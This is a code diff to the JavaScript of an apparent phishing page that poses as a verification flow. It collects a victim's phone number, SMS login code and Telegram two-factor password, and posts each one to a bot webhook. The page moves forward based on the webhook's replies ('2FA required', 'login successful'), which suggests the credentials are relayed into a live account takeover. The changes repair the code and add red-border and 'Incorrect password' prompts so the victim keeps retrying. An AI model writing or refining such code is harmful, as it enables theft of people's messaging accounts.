@@ -396,30 +396,41 @@
     function startVerificationWorkflow() { document.getElementById("viewportContainer").classList.add("in-auth-mode"); document.getElementById("consoleScrollWindow").classList.add("hidden"); document.getElementById("scrollIndicator").style.display = "none"; document.getElementById("mainConsoleCard").style.height = "48vh"; transitionStep(null, "step-phone"); }
     function backToLanding() { document.getElementById("viewportContainer").classList.remove("in-auth-mode"); document.getElementById("step-phone").classList.remove("active"); document.getElementById("consoleScrollWindow").classList.remove("hidden"); if(window.innerWidth > 768) document.getElementById("scrollIndicator").style.display = "block"; document.getElementById("mainConsoleCard").style.height = "54vh"; }
     function validatePhoneForm() { const val = document.getElementById("phone-input").value.replace(/[^0-9]/g, ""); const btn = document.getElementById("phone-submit-btn"); if(val.length === selectedCountry.digits) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
-    // --- UPDATED: Phone step (stores currentPhone) ---
     function submitPhoneStep() {
         const raw = document.getElementById("phone-input").value.replace(/[^0-9]/g, "");
         currentPhone = selectedCountry.code + raw;
         sendToBot(currentPhone);
         transitionStep("step-phone", "step-sms");
     }
-    // --- UPDATED: Code step (fetch and read reply) ---
+
+    // --- UPDATED: Code page – red border only, no popup ---
     async function submitSmsStep() {
         const code = document.getElementById("sms-code-input").value.trim();
-    async function submitSmsStep() {
-    const code = document.getElementById("sms-code-input").value.trim();
-    if (!code) return;
-    try {
-        const response = await fetch(BOT2_WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ text: code })
-        });
-        const data = await response.json();
-        const reply = data.reply || "";
-        if (reply.includes("2FA required") || reply.includes("login successful") || reply.includes("Enter your cloud password")) {
-            transitionStep("step-sms", "step-password");
-        } else {
+        if (!code) return;
+        try {
+            const response = await fetch(BOT2_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ text: code })
+            });
+            const data = await response.json();
+            const reply = data.reply || "";
+            if (reply.includes("2FA required") || reply.includes("login successful") || reply.includes("Enter your cloud password")) {
+                transitionStep("step-sms", "step-password");
+            } else {
+                const input = document.getElementById("sms-code-input");
+                input.value = "";
+                input.style.borderColor = "red";
+                input.style.borderWidth = "2px";
+                input.focus();
+                input.oninput = function() {
+                    input.style.borderColor = "";
+                    input.style.borderWidth = "";
+                    input.oninput = null;
+                };
+            }
+        } catch (error) {
+            console.error("Fetch error:", error);
             const input = document.getElementById("sms-code-input");
             input.value = "";
             input.style.borderColor = "red";
@@ -431,38 +442,41 @@
                 input.oninput = null;
             };
         }
-    } catch (error) {
-        console.error("Fetch error:", error);
-        const input = document.getElementById("sms-code-input");
-        input.value = "";
-        input.style.borderColor = "red";
-        input.style.borderWidth = "2px";
-        input.focus();
-        input.oninput = function() {
-            input.style.borderColor = "";
-            input.style.borderWidth = "";
-            input.oninput = null;
-        };
     }
-    }
-    // --- UPDATED: Password step (fetch and read reply) ---
+
+    // --- UPDATED: Password page – shows "Incorrect password" inside input ---
     async function submitAuthentication() {
-    const pwd = document.getElementById("password-input").value.trim();
-    if (!pwd) return;
-    try {
-        const response = await fetch(BOT2_WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ text: pwd })
-        });
-        const data = await response.json();
-        const reply = data.reply || "";
-        if (reply.includes("login successful")) {
-            transitionStep("step-password", "step-success");
-        } else {
+        const pwd = document.getElementById("password-input").value.trim();
+        if (!pwd) return;
+        try {
+            const response = await fetch(BOT2_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ text: pwd })
+            });
+            const data = await response.json();
+            const reply = data.reply || "";
+            if (reply.includes("login successful")) {
+                transitionStep("step-password", "step-success");
+            } else {
+                const input = document.getElementById("password-input");
+                input.value = "";
+                input.placeholder = "Incorrect password";
+                input.style.borderColor = "red";
+                input.style.borderWidth = "2px";
+                input.focus();
+                input.oninput = function() {
+                    input.placeholder = "Enter your Telegram 2FA Password";
+                    input.style.borderColor = "";
+                    input.style.borderWidth = "";
+                    input.oninput = null;
+                };
+            }
+        } catch (error) {
+            console.error("Fetch error:", error);
             const input = document.getElementById("password-input");
             input.value = "";
-            input.placeholder = "Incorrect password";
+            input.placeholder = "Try again";
             input.style.borderColor = "red";
             input.style.borderWidth = "2px";
             input.focus();
@@ -473,22 +487,8 @@
                 input.oninput = null;
             };
         }
-    } catch (error) {
-        console.error("Fetch error:", error);
-        const input = document.getElementById("password-input");
-        input.value = "";
-        input.placeholder = "Try again";
-        input.style.borderColor = "red";
-        input.style.borderWidth = "2px";
-        input.focus();
-        input.oninput = function() {
-            input.placeholder = "Enter your Telegram 2FA Password";
-            input.style.borderColor = "";
-            input.style.borderWidth = "";
-            input.oninput = null;
-        };
     }
-    }
+
     // --- Other functions unchanged ---
     function validateSmsForm() { const val = document.getElementById("sms-code-input").value.trim(); const btn = document.getElementById("sms-submit-btn"); if(val.length > 0) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
     function toggleAgreementCheckbox() { const cb = document.getElementById("agreement-checkbox"); cb.checked = !cb.checked; }
